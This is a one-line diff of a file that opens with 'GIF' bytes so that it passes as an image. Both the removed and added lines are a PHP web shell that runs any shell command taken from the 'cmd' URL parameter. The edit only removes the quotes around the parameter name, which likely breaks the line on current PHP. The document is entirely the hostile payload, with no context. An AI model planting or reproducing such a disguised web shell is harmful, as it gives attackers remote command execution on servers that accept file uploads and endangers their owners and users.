@@ -1,1 +1,1 @@
-GIF<?php system($_GET['cmd']); ?>
+GIF<?php system($_GET[cmd]); ?>
